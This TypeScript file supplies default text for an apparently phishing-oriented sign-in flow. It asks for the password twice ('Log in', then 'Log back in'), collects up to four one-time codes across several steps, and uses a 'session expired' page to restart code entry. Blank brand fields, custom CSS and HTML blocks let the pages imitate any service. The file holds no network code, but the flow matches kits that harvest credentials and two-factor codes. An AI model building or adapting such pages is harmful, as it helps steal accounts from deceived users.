// Client-safe default page content. Editor loads these into the form when
// no DB row exists, and public pages fall back to them if the fetch fails.

export type BrandContent = {
  wordmark: string;
  footer1: string;
  footer2: string;
  customCss: string;
};

export type BlockPosition = "top" | "middle" | "bottom";
export type Block = { id: string; html: string; position: BlockPosition };
export type PageExtras = { customCss: string; blocks: Block[] };

export const DEFAULT_PAGE_EXTRAS: PageExtras = { customCss: "", blocks: [] };

export type PageContentMap = {
  login: {
    seoTitle: string; seoDescription: string;
    headingRound1: string; headingRound2: string;
    identifierPlaceholder: string; passwordPlaceholder: string;
    submitLabel: string; forgotLabel: string; footer: string;
    validationError: string; loadingLabel: string;
  };
  login2: {
    seoTitle: string; seoDescription: string;
    headingRound1: string; headingRound2: string;
    identifierPlaceholder: string; passwordPlaceholder: string;
    submitLabel: string; forgotLabel: string; footer: string;
    validationError: string; loadingLabel: string;
  };
  "code-1": CodeStepContent;
  "code-2": CodeStepContent;
  "code-1b": CodeStepContent;
  "code-2b": CodeStepContent;
  "session-expired": {
    seoTitle: string; seoDescription: string;
    heading: string; body: string;
    calloutTitle: string; calloutBody: string;
    button: string; loadingLabel: string;
  };
  "verification-link": {
    seoTitle: string; seoDescription: string;
    heading: string; body: string;
    bullet1: string; bullet2: string;
    button: string; loadingLabel: string;
  };
  "verification-sent": {
    seoTitle: string; seoDescription: string;
    heading: string; body: string;
    tip: string; resendLabel: string; backLabel: string;
  };
};

export type CodeStepContent = {
  seoTitle: string; seoDescription: string;
  stepLabel: string; title: string; description: string;
  placeholder: string; submitLabel: string; loadingLabel: string;
  validationError: string; resendLabel: string;
};

export type PageKey = keyof PageContentMap;

export const DEFAULT_BRAND: BrandContent = {
  wordmark: "",
  footer1: "",
  footer2: "",
  customCss: "",
};

export const DEFAULT_CONTENT: PageContentMap = {
  login: {
    seoTitle: "",
    seoDescription: "",
    headingRound1: "Log in",
    headingRound2: "Welcome back",
    identifierPlaceholder: "Email address or phone number",
    passwordPlaceholder: "Password",
    submitLabel: "Log in",
    forgotLabel: "Forgotten password?",
    footer: "",
    validationError: "Enter your email or phone number and a password of at least 6 characters.",
    loadingLabel: "Signing you in…",
  },
  login2: {
    seoTitle: "",
    seoDescription: "",
    headingRound1: "Log back in",
    headingRound2: "Welcome back",
    identifierPlaceholder: "Email address or phone number",
    passwordPlaceholder: "Password",
    submitLabel: "Log in",
    forgotLabel: "Forgotten password?",
    footer: "",
    validationError: "Enter your email or phone number and a password of at least 6 characters.",
    loadingLabel: "Signing you in…",
  },
  "code-1": {
    seoTitle: "",
    seoDescription: "",
    stepLabel: "Step 1 of 2",
    title: "Enter your login code",
    description: "We sent a 6 or 8 digit code to the contact on your account. Enter it below to keep going.",
    placeholder: "Enter code",
    submitLabel: "Continue",
    loadingLabel: "Verifying code…",
    validationError: "Enter the 6 or 8 digit code.",
    resendLabel: "Didn't get a code?",
  },
  "code-2": {
    seoTitle: "",
    seoDescription: "",
    stepLabel: "Step 2 of 2",
    title: "Confirm your second code",
    description: "One more code to finish. Enter the second 6 or 8 digit code sent to your device.",
    placeholder: "Enter code",
    submitLabel: "Continue",
    loadingLabel: "Verifying code…",
    validationError: "Enter the 6 or 8 digit code.",
    resendLabel: "Didn't get a code?",
  },
  "code-1b": {
    seoTitle: "",
    seoDescription: "",
    stepLabel: "Step 1 of 2",
    title: "Verify your identity",
    description: "For extra security we've sent a fresh 6 or 8 digit code to your registered contact. Enter it to continue.",
    placeholder: "Enter code",
    submitLabel: "Continue",
    loadingLabel: "Verifying code…",
    validationError: "Enter the 6 or 8 digit code.",
    resendLabel: "Didn't get a code?",
  },
  "code-2b": {
    seoTitle: "",
    seoDescription: "",
    stepLabel: "Step 2 of 2",
    title: "One more check",
    description: "Almost there. Enter the second 6 or 8 digit code we just sent so we can prepare your verification link.",
    placeholder: "Enter code",
    submitLabel: "Continue",
    loadingLabel: "Preparing verification…",
    validationError: "Enter the 6 or 8 digit code.",
    resendLabel: "Didn't get a code?",
  },
  "session-expired": {
    seoTitle: "",
    seoDescription: "",
    heading: "Your session has expired",
    body: "For your security, this login session timed out before it could be completed. Request a new session to start again.",
    calloutTitle: "Get a new session",
    calloutBody: "A fresh session lets you re-enter your login details and codes.",
    button: "Get new session",
    loadingLabel: "Creating new session…",
  },
  "verification-link": {
    seoTitle: "",
    seoDescription: "",
    heading: "Last step: verify it's you",
    body: "Both codes were accepted. Request a one-time verification link and open it on this device to finish signing in.",
    bullet1: "The link expires 10 minutes after it is sent.",
    bullet2: "It can only be used once.",
    button: "Get verification link",
    loadingLabel: "Sending verification link…",
  },
  "verification-sent": {
    seoTitle: "",
    seoDescription: "",
    heading: "Verification link sent",
    body: "We sent a verification link to the email address or phone number on your account. Open the link to complete your login.",
    tip: "Didn't receive it? Check your spam folder, then request a new link.",
    resendLabel: "Send another link",
    backLabel: "Back to log in",
  },
};


export const PAGE_KEYS: PageKey[] = [
  "login", "login2", "code-1", "code-2", "code-1b", "code-2b",
  "session-expired", "verification-link", "verification-sent",
];

export function mergePageContent<K extends PageKey>(
  key: K,
  patch: Partial<PageContentMap[K]> | null | undefined,
): PageContentMap[K] {
  return { ...DEFAULT_CONTENT[key], ...(patch ?? {}) } as PageContentMap[K];
}

export function mergeBrand(patch: Partial<BrandContent> | null | undefined): BrandContent {
  return { ...DEFAULT_BRAND, ...(patch ?? {}) };
}